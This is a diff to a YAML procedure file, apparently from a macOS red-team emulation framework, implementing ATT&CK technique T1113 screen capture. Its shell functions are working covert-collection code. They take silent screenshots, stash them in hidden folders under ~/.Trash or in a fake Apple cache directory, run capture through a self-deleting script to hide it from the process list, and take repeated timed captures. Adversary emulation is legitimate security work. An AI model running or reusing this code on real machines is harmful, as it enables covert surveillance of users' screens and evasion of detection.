@@ -1,12 +1,12 @@
 procedure_name: screen_capture
 ttp_id: T1113
 tactic: Collection
-guid: c10de95f-2e46-4268-8c04-491d90308215
+guid: 629c194e-c952-4cbc-bfa6-9c224b31d118
 intent: Capture screenshots of the desktop for reconnaissance and data collection
 author: '@darmado | https://x.com/darmad0'
-version: 1.0.0
+version: 1.0.3
 created: '2025-05-28'
-updated: '2025-05-30'
+updated: '2025-06-03'
 procedure:
   arguments:
   - option: -s|--screenshot
@@ -101,12 +101,20 @@ procedure:
     opsec:
       check_fda:
         enabled: false
-    code: "capture_screenshot() {\n    printf \"SCREENSHOT|capturing|Silent screenshot\\\
-      \\n\"\n    \n    # Capture screenshot silently (no sound, no UI)\n    screencapture\
-      \ -x \"$SCREENSHOT_PATH\"\n    \n    if [ -f \"$SCREENSHOT_PATH\" ]; then\n\
-      \        file_size=$(stat -f%z \"$SCREENSHOT_PATH\")\n        printf \"SCREENSHOT|captured|%s\
-      \ (%s bytes)\\\\n\" \"$SCREENSHOT_PATH\" \"$file_size\"\n    else\n        printf\
-      \ \"SCREENSHOT|failed|Could not capture screenshot\\\\n\"\n    fi\n}\n"
+    code: |
+      capture_screenshot() {
+          printf "SCREENSHOT|capturing|Silent screenshot\n"
+          
+          # Capture screenshot silently (no sound, no UI)
+          screencapture -x "$SCREENSHOT_PATH"
+          
+          if [ -f "$SCREENSHOT_PATH" ]; then
+              file_size=$(stat -f%z "$SCREENSHOT_PATH")
+              printf "SCREENSHOT|captured|%s (%s bytes)\n" "$SCREENSHOT_PATH" "$file_size"
+          else
+              printf "SCREENSHOT|failed|Could not capture screenshot\n"
+          fi
+      }
   - name: capture_screenshot_with_info
     type: main
     language:
@@ -115,17 +123,28 @@ procedure:
     opsec:
       check_fda:
         enabled: false
-    code: "capture_screenshot_with_info() {\n    printf \"SCREENSHOT|capturing|Screenshot\
-      \ with display info\\\\n\"\n    \n    # Get display information first\n    display_count=$(system_profiler\
-      \ SPDisplaysDataType | grep -c \"Resolution:\")\n    printf \"SCREENSHOT|displays|%s\\\
-      \\n\" \"$display_count\"\n    \n    # Capture screenshot\n    screencapture\
-      \ -x \"$SCREENSHOT_PATH\"\n    \n    if [ -f \"$SCREENSHOT_PATH\" ]; then\n\
-      \        file_size=$(stat -f%z \"$SCREENSHOT_PATH\")\n        printf \"SCREENSHOT|captured|%s\
-      \ (%s bytes)\\\\n\" \"$SCREENSHOT_PATH\" \"$file_size\"\n        \n        #\
-      \ Get image dimensions\n        image_info=$(file \"$SCREENSHOT_PATH\")\n  \
-      \      printf \"SCREENSHOT|info|%s\\\\n\" \"$image_info\"\n    else\n      \
-      \  printf \"SCREENSHOT|failed|Could not capture screenshot\\\\n\"\n    fi\n\
-      }\n"
+    code: |
+      capture_screenshot_with_info() {
+          printf "SCREENSHOT|capturing|Screenshot with display info\n"
+          
+          # Get display information first
+          display_count=$(system_profiler SPDisplaysDataType)
+          printf "SCREENSHOT|displays|%s\n" "$display_count"
+          
+          # Capture screenshot
+          screencapture -x "$SCREENSHOT_PATH"
+          
+          if [ -f "$SCREENSHOT_PATH" ]; then
+              file_size=$(stat -f%z "$SCREENSHOT_PATH")
+              printf "SCREENSHOT|captured|%s (%s bytes)\n" "$SCREENSHOT_PATH" "$file_size"
+              
+              # Get image dimensions
+              image_info=$(file "$SCREENSHOT_PATH")
+              printf "SCREENSHOT|info|%s\n" "$image_info"
+          else
+              printf "SCREENSHOT|failed|Could not capture screenshot\n"
+          fi
+      }
   - name: capture_hidden_screenshot
     type: main
     language:
@@ -134,16 +153,25 @@ procedure:
     opsec:
       check_fda:
         enabled: false
-    code: "capture_hidden_screenshot() {\n    # Create hidden directory in .Trash\n\
-      \    mkdir -p \"$HOME/.Trash/.ss\" 2>/dev/null\n    local output_path=\"$HOME/.Trash/.ss/$(date\
-      \ +%Y%m%d_%H%M%S).jpg\"\n    \n    printf \"HIDDEN_SCREENSHOT|capturing|Using\
-      \ hidden storage in .Trash\\\\n\"\n    \n    # Direct screencapture to hidden\
-      \ location\n    screencapture -x \"$output_path\" 2>/dev/null\n    \n    if\
-      \ [ -f \"$output_path\" ]; then\n        file_size=$(stat -f%z \"$output_path\"\
-      \ 2>/dev/null || echo \"unknown\")\n        printf \"HIDDEN_SCREENSHOT|captured|%s\
-      \ (%s bytes)\\\\n\" \"$output_path\" \"$file_size\"\n    else\n        printf\
-      \ \"HIDDEN_SCREENSHOT|failed|capture failed\\\\n\"\n        return 1\n    fi\n\
-      }\n"
+    code: |
+      capture_hidden_screenshot() {
+          # Create hidden directory in .Trash
+          mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
+          local output_path="$HOME/.Trash/.ss/$(date +%Y%m%d_%H%M%S).jpg"
+          
+          printf "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\n"
+          
+          # Direct screencapture to hidden location
+          screencapture -x "$output_path" 2>/dev/null
+          
+          if [ -f "$output_path" ]; then
+              file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+              printf "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
+          else
+              printf "HIDDEN_SCREENSHOT|failed|capture failed\n"
+              return 1
+          fi
+      }
   - name: capture_masquerade_screenshot
     type: main
     language:
@@ -152,21 +180,33 @@ procedure:
     opsec:
       check_fda:
         enabled: false
-    code: "capture_masquerade_screenshot() {\n    # Create hidden directory with random\
-      \ name\n    local random_dir=\"$HOME/.Trash/.$(openssl rand -hex 4)\"\n    mkdir\
-      \ -p \"$random_dir\" 2>/dev/null\n    local output_path=\"$random_dir/temp_$(date\
-      \ +%s).jpg\"\n    \n    printf \"MASQUERADE_SCREENSHOT|capturing|Using process\
-      \ name masquerading\\\\n\"\n    \n    # Create a temporary script that runs\
-      \ screencapture\n    local temp_script=\"/tmp/capture_$(openssl rand -hex 4).sh\"\
-      \n    echo \"#!/bin/sh\" > \"$temp_script\"\n    echo \"screencapture -x '$output_path'\"\
-      \ >> \"$temp_script\"\n    chmod +x \"$temp_script\"\n    \n    # Execute via\
-      \ temporary script (hides screencapture in process list)\n    \"$temp_script\"\
-      \ 2>/dev/null\n    rm -f \"$temp_script\" 2>/dev/null\n    \n    if [ -f \"\
-      $output_path\" ]; then\n        file_size=$(stat -f%z \"$output_path\" 2>/dev/null\
-      \ || echo \"unknown\")\n        printf \"MASQUERADE_SCREENSHOT|captured|%s (%s\
-      \ bytes)\\\\n\" \"$output_path\" \"$file_size\"\n    else\n        printf \"\
-      MASQUERADE_SCREENSHOT|failed|capture failed\\\\n\"\n        return 1\n    fi\n\
-      }\n"
+    code: |
+      capture_masquerade_screenshot() {
+          # Create hidden directory with random name
+          local random_dir="$HOME/.Trash/.$(openssl rand -hex 4)"
+          mkdir -p "$random_dir" 2>/dev/null
+          local output_path="$random_dir/temp_$(date +%s).jpg"
+          
+          printf "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\n"
+          
+          # Create a temporary script that runs screencapture
+          local temp_script="/tmp/capture_$(openssl rand -hex 4).sh"
+          echo "#!/bin/sh" > "$temp_script"
+          echo "screencapture -x '$output_path'" >> "$temp_script"
+          chmod +x "$temp_script"
+          
+          # Execute via temporary script (hides screencapture in process list)
+          "$temp_script" 2>/dev/null
+          rm -f "$temp_script" 2>/dev/null
+          
+          if [ -f "$output_path" ]; then
+              file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+              printf "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
+          else
+              printf "MASQUERADE_SCREENSHOT|failed|capture failed\n"
+              return 1
+          fi
+      }
   - name: capture_cache_screenshot
     type: main
     language:
@@ -175,16 +215,25 @@ procedure:
     opsec:
       check_fda:
         enabled: false
-    code: "capture_cache_screenshot() {\n    # Create realistic cache directory\n\
-      \    mkdir -p \"$HOME/Library/Caches/com.apple.screencapture\" 2>/dev/null\n\
-      \    local output_path=\"$HOME/Library/Caches/com.apple.screencapture/capture_$(date\
-      \ +%s).jpg\"\n    \n    printf \"CACHE_SCREENSHOT|capturing|Using realistic\
-      \ cache directory\\\\n\"\n    \n    # Direct screencapture to cache location\n\
-      \    screencapture -x \"$output_path\" 2>/dev/null\n    \n    if [ -f \"$output_path\"\
-      \ ]; then\n        file_size=$(stat -f%z \"$output_path\" 2>/dev/null || echo\
-      \ \"unknown\")\n        printf \"CACHE_SCREENSHOT|captured|%s (%s bytes)\\\\\
-      n\" \"$output_path\" \"$file_size\"\n    else\n        printf \"CACHE_SCREENSHOT|failed|capture\
-      \ failed\\\\n\"\n        return 1\n    fi\n}\n"
+    code: |
+      capture_cache_screenshot() {
+          # Create realistic cache directory
+          mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
+          local output_path="$HOME/Library/Caches/com.apple.screencapture/capture_$(date +%s).jpg"
+          
+          printf "CACHE_SCREENSHOT|capturing|Using realistic cache directory\n"
+          
+          # Direct screencapture to cache location
+          screencapture -x "$output_path" 2>/dev/null
+          
+          if [ -f "$output_path" ]; then
+              file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+              printf "CACHE_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
+          else
+              printf "CACHE_SCREENSHOT|failed|capture failed\n"
+              return 1
+          fi
+      }
   - name: capture_osascript_screenshot
     type: main
     language:
@@ -193,18 +242,25 @@ procedure:
     opsec:
       check_fda:
         enabled: false
-    code: "capture_osascript_screenshot() {\n    # Create hidden directory in .Trash\n\
-      \    mkdir -p \"$HOME/.Trash/.ss\" 2>/dev/null\n    local output_path=\"$HOME/.Trash/.ss/osascript_$(date\
-      \ +%Y%m%d_%H%M%S).jpg\"\n    \n    printf \"OSASCRIPT_SCREENSHOT|capturing|Using\
-      \ osascript/AppleScript interpreter\\\\n\"\n    \n    # Use osascript to execute\
-      \ screencapture (may prompt for automation permissions)\n    osascript -e \"\
-      tell application \\\"System Events\\\" to do shell script \\\"screencapture\
-      \ -x '$output_path'\\\"\" 2>/dev/null\n    \n    if [ -f \"$output_path\" ];\
-      \ then\n        file_size=$(stat -f%z \"$output_path\" 2>/dev/null || echo \"\
-      unknown\")\n        printf \"OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\\\\\
-      n\" \"$output_path\" \"$file_size\"\n    else\n        printf \"OSASCRIPT_SCREENSHOT|failed|capture\
-      \ failed (may need automation permissions)\\\\n\"\n        return 1\n    fi\n\
-      }\n"
+    code: |
+      capture_osascript_screenshot() {
+          # Create hidden directory in .Trash
+          mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
+          local output_path="$HOME/.Trash/.ss/osascript_$(date +%Y%m%d_%H%M%S).jpg"
+          
+          printf "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\n"
+          
+          # Use osascript to execute screencapture (may prompt for automation permissions)
+          osascript -e "tell application \"System Events\" to do shell script \"screencapture -x '$output_path'\"" 2>/dev/null
+          
+          if [ -f "$output_path" ]; then
+              file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+              printf "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
+          else
+              printf "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\n"
+              return 1
+          fi
+      }
   - name: capture_swift_screenshot
     type: main
     language:
@@ -445,3 +501,65 @@ procedure:
       \ \"$file_size\"\n                captured_count=$((captured_count + 1))\n \
       \           fi\n        fi\n    done\n    \n    printf \"APP_SCREENSHOT|summary|Captured\
       \ %d application windows\\\\n\" \"$captured_count\"\n} "
+  - name: capture_screen_single
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: false
+    code: |
+      capture_screen_single() {
+          local timestamp=$(date '+%Y%m%d_%H%M%S')
+          local output_file="/tmp/screen_capture_${timestamp}.png"
+          
+          $CMD_PRINTF "SCREEN_CAPTURE|SINGLE|Capturing screen to %s\n" "$output_file"
+          
+          # Capture screen using screencapture command
+          if $CMD_SCREENCAPTURE -x "$output_file" 2>/dev/null; then
+              local file_size=$(stat -f%z "$output_file" 2>/dev/null || echo "0")
+              $CMD_PRINTF "SCREEN_CAPTURE|SUCCESS|File: %s Size: %s bytes\n" "$output_file" "$file_size"
+          else
+              $CMD_PRINTF "SCREEN_CAPTURE|ERROR|Failed to capture screen\n"
+              return 1
+          fi
+          
+          return 0
+      }
+  - name: capture_screen_timed
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: false
+    code: |
+      capture_screen_timed() {
+          local duration="${DURATION_ARG:-$DEFAULT_DURATION}"
+          local interval="${INTERVAL_ARG:-$DEFAULT_INTERVAL}"
+          
+          $CMD_PRINTF "SCREEN_CAPTURE|TIMED|Starting timed capture for %s seconds at %s second intervals\n" "$duration" "$interval"
+          
+          local end_time=$(($(date +%s) + duration))
+          local capture_count=0
+          
+          while [ $(date +%s) -lt $end_time ]; do
+              local timestamp=$(date '+%Y%m%d_%H%M%S')
+              local output_file="/tmp/screen_capture_${timestamp}.png"
+              
+              if $CMD_SCREENCAPTURE -x "$output_file" 2>/dev/null; then
+                  capture_count=$((capture_count + 1))
+                  local file_size=$(stat -f%z "$output_file" 2>/dev/null || echo "0")
+                  $CMD_PRINTF "SCREEN_CAPTURE|%d|File: %s Size: %s bytes\n" "$capture_count" "$output_file" "$file_size"
+              else
+                  $CMD_PRINTF "SCREEN_CAPTURE|ERROR|Failed to capture screen at interval %d\n" "$capture_count"
+              fi
+              
+              sleep "$interval"
+          done
+          
+          $CMD_PRINTF "SCREEN_CAPTURE|COMPLETE|Captured %d screenshots over %s seconds\n" "$capture_count" "$duration"
+          return 0
+      }
